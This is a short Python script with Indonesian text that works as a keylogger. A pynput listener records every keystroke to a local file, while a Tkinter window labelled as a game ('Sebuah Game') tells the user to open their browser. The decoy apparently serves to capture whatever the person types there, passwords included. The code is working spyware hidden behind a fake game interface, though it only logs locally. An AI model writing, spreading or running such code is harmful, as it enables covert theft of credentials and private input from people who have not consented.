import string as str
import tkinter as tk
from pynput import keyboard

LETTERS = set(str.ascii_letters)

def on_press(key):
    try:
        char_key = key.char
        key_str = char_key
    except AttributeError:
        key_str = key.name
        
    with open("keylog2.txt", "a") as file:
        if key_str == "enter":        
            file.write("[RETURN]\n")
        elif key_str not in LETTERS:
            file.write(f"[{key_str.upper()}] ")
        else:
            file.write(f"{key_str} ")
    
    print(f"Key pressed di background: {key_str}")
    
listener = keyboard.Listener(on_press=on_press)
listener.start()

window = tk.Tk()
window.title("Sebuah Game")
window.geometry("500x300")

label = tk.Label(
    window,
    text = "Buka browser.",
    font = ("Poppins", 12),
)
label.pack(pady=90)

try:
    window.mainloop()
finally:
    listener.stop()

window = tk.Tk()